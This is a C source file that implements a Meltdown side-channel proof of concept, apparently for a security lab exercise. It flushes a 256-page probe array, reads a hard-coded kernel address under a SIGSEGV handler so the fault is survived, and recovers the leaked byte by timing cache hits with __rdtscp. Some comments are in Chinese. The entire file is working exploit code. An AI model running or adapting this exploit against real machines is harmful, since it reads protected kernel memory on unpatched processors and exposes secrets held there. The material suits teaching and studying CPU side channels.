#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

uint8_t array[256*4096];
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
  int i;
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

void reloadSideChannel() 
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
     addr = &array[i*4096 + DELTA];
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     if (time2 <= CACHE_HIT_THRESHOLD){
         printf("array[%d*4096 + %d] is in cache，the value is %d\n",i, DELTA, array[i * 4096 + DELTA]);
         printf("The Secret = %d.\n",i);
     }
  }	
}

void meltdown(unsigned long kernel_data_addr)
{
  char kernel_data = 0;
  //下述语句会造成异常
  kernel_data = *(char*)kernel_data_addr;
  array[kernel_data * 4096 + DELTA] += 1;
  kernel_data += 1;
  //array[7 * 4096 + DELTA] += 1;
}

//to improve the system performance it's also can implement by accessbly language
void meltdown_asm(unsigned long kernel_data_addr)
{
   char kernel_data = 0;
   // Give eax register something to do
   asm volatile(
       ".rept 400;"                
       "add $0x141, %%eax;"
       ".endr;"                    
    
       :
       :
       : "eax"
   ); 
  //下述语句会造成异常
   kernel_data = *(char*)kernel_data_addr;  
  //无序执行会执行这一步
   array[kernel_data * 4096 + DELTA] += 1;           
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv()
{
  siglongjmp(jbuf, 1);
}

int main()
{
  // Register a signal handler
  signal(SIGSEGV, catch_segv);
  flushSideChannel(); 
  if (sigsetjmp(jbuf, 1) == 0) {
     //meltdown(0xfb61b000);
     meltdown(0xfb81c000);                
  }
  else {
      printf("内存访问非法!\n");
  }
  reloadSideChannel();                     
  return 0;
}
